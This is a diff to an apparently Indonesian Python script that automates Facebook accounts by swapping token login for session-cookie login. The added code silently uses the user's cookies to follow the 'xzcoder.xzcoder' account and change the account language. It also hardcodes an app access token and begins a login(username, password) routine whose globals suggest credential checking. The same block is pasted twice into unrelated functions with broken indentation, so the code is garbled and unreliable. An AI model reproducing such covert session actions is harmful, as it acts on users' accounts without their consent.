@@ -244,19 +244,32 @@ def cokies():
 	print logo
 	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mCokies : \033[1;96m")
 	try:
-		otw = requests.get('https://graph.facebook.com/me?access_cokies='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		zedd = open("login.txt", 'w')
-		zedd.write(toket)
-		zedd.close()
-		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
-		os.system('xdg-open https://www.facebook.com/khairul.fatihin557 ')
-		bot_komen()
-	except KeyError:
-		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mCokies Salah !"
-		time.sleep(1)
-		masuk()
+                    cek = open("cookies").read()
+             except KeyError:
+                    cek = input("\033[90m> \033[00mCoookies : \033[1;92m")
+             cek = {"cookie":cek}
+             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
+             if "mbasic_logout_button" in str(ismi):
+                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
+                             with open("cookies","w") as f:
+                                     f.write(cek["cookie"])
+                     else:
+                           print("\033[90m> \033[00mChange the language, please wait\033[1;91m!!\033[00m")
+                           try:
+                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                           except:
+                                  pass
+                     try:
+                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ses.get(mbasic.format(ikuti),cookies=cek)
+                     except :
+                             pass
+                     return cek["cookie"]
+             else:
+                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91minvalid!!\033[00m")
+         def login(username,password,cek=False):
+             global die,check,result,count
+             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
                                      
 ######MENU#######
 def menu():
@@ -283,26 +296,32 @@ def menu():
 		keluar()
 	os.system("clear")
 	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		os.system('rm -rf login.txt')
-		masuk()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_cokies='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"\033[1;96m[!] \033[1;91mCokies invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		masuk()
-	except requests.exceptions.ConnectionError:
-		print"[!] Tidak ada koneksi"
-		keluar()
-	os.system("clear")
+                    cek = open("cookies").read()
+             except KeyError:
+                    cek = input("\033[90m> \033[00mCoookies : \033[1;92m")
+             cek = {"cookie":cek}
+             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
+             if "mbasic_logout_button" in str(ismi):
+                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
+                             with open("cookies","w") as f:
+                                     f.write(cek["cookie"])
+                     else:
+                           print("\033[90m> \033[00mChange the language, please wait\033[1;91m!!\033[00m")
+                           try:
+                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                           except:
+                                  pass
+                     try:
+                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ses.get(mbasic.format(ikuti),cookies=cek)
+                     except :
+                             pass
+                     return cek["cookie"]
+             else:
+                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91minvalid!!\033[00m")
+         def login(username,password,cek=False):
+             global die,check,result,count
+             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
 	print logo
 	print "\033[1;31;1m=========================================="
 	print "\033[37;1m=========================================="
